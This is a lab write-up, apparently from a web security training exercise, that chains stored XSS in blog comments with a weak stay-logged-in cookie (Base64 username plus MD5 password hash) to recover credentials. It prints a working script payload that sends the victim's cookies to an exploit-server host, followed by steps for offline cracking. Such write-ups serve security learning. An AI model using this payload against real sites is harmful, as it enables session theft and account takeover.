# Lab: Offline password cracking

## Vulnerability Summary

- The lab contains a Stored Cross-Site Scripting (XSS) vulnerability in the comment functionality, allowing arbitrary JavaScript execution in the victim’s browser.
- The "stay-logged-in" mechanism is insecurely implemented, as the cookie contains:

  - the username encoded in Base64
  - the password hashed using MD5
- This allows an attacker to steal the cookie and recover user credentials via offline cracking.

## Attack Steps

1. Analyze the "stay-logged-in" cookie

- Log in as user `wiener`
- Inspect cookies in the browser
- Identify the structure:

```
base64(username):md5(password)
```

2. Identify Stored XSS

- Navigate to a blog post with a comment section
- Submit the following payload:

```
<script>alert(1)</script>
```

- Confirm that JavaScript executes when the comment is viewed

3. Exploit XSS to steal cookies

- Submit the following payload:

```
<script>document.location='https://exploit-server.net/'+document.cookie</script>
```

- `document.location` redirects the victim to the attacker-controlled server
- `document.cookie` extracts the victim’s cookies

4. Capture victim cookie

- Check incoming requests on the exploit server
- Extract the "stay-logged-in" cookie

5. Recover credentials

- Decode Base64 → obtain username
- Extract MD5 hash → perform offline cracking

6. Authenticate as victim

- Use recovered credentials to log in as the victim user

<img width="1920" height="1080" alt="Screenshot_2026-04-08_20_53_51" src="https://github.com/user-attachments/assets/07f7e6c7-8a67-4bfc-82ec-281adff051c7" />

<img width="1920" height="1080" alt="Screenshot_2026-04-08_20_56_23" src="https://github.com/user-attachments/assets/14b12850-eb69-4073-840d-a43676265842" />

<img width="1920" height="1080" alt="Screenshot_2026-04-08_20_56_54" src="https://github.com/user-attachments/assets/ec7fc7d0-4e6f-4d5e-a994-1562378fa20a" />

<img width="1920" height="1080" alt="Screenshot_2026-04-08_20_58_27" src="https://github.com/user-attachments/assets/f2253755-911c-4423-80ef-3fc7058c12b2" />

<img width="1920" height="1080" alt="Screenshot_2026-04-08_21_01_08" src="https://github.com/user-attachments/assets/1e4ec7a5-7f0b-4040-bc5c-6c44ec52f7d3" />

## Exploitation

- The attack is performed via Stored XSS
- An exploit server is used to collect stolen cookies
- The entire process can be executed using a browser and DevTools

## Impact

- Stored XSS enables execution of arbitrary JavaScript in any user’s browser
- The "stay-logged-in" cookie exposes sensitive authentication data
- Use of MD5 allows efficient offline password cracking

Consequences:

- Account takeover
- Potential administrator compromise
- Large-scale credential and session theft
